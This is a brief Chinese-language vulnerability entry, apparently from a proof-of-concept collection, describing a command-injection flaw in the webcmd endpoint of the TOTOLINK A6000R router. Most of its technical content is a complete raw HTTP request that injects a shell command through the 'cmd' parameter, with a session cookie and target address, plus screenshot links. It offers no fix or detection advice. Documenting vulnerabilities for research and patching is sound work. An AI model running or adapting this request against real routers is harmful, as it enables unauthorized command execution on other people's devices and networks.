# T18-1TOTOLINK-A6000R-远程命令执行漏洞

TOTOLINK A6000R是一款性能卓越的无线路由器，采用先进的技术和设计，为用户提供出色的网络体验。其支持最新的Wi-Fi标准，可实现高速稳定的无线连接，适用于各种网络需求，包括流畅的高清视频流、快速的在线游戏和大规模文件传输。双频段支持让用户可以根据需求选择最佳的无线信号频段，确保网络稳定性和速度。此设备中的[webcmd](https://cn-sec.com/archives/tag/webcmd) 函数中存在命令注入漏洞，攻击者可以通过webcmd 函数中的cmd参数包含命令，进行命令执行攻击。

## poc

```java
GET /cgi-bin/luci/admin/mtk/webcmd?cmd=ls%20/>/www/555.txt HTTP/1.1
Host: 192.168.187.136
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: sysauth=80c79bd6ad9bfba9656b7a8bee2a988f
```

![TOTOLINK-A6000R-RCE](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271211651.png)

![TOTOLINK-A6000R-RCE](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407271211927.png)